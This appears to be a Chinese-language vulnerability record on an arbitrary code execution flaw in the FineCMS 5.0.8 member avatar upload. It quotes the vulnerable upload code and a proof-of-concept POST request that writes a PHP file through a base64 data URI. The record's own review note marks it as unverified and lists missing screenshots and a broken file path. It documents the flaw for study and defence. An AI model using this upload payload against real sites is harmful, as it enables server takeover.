---
source: "hatch 补库批 20260928"
product: "FineCMS5.0.8 member avatar"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Finecms 5.0.8 会员中心任意代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：会员注册登录及PHP上传目录执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0d80262dab645b9d49f0f8b3"
entity_id: "ve-0d80262dab645b9d49f0f8b3"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：会员注册登录及PHP上传目录执行

- **结论使用边界（1）**：与171/172第二节同源；源码路径controllersmemberAccount.php丢分隔符。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：仅2.png3.png占位，图片未保留正文；没有完整POST/响应，但核心tx数据URI已有文本。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Finecms 5.0.8 会员中心任意代码执行漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Finecms 5.0.8

三、复现过程
------------

### 漏洞分析

在文件`./controllersmemberAccount.php`中的upload函数

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                    $new_file = $dir.'0x0.'.$result[2];
                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                        exit(dr_json(0, '目录权限不足或磁盘已满'));
                    

### 漏洞复现

注册会员，登录访问：

    http://www.0-sec.org:88/index.php?s=member&c=account&m=upload

    POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+

2.png

3.png

参考链接
--------

> http://4o4notfound.org/index.php/archives/40/
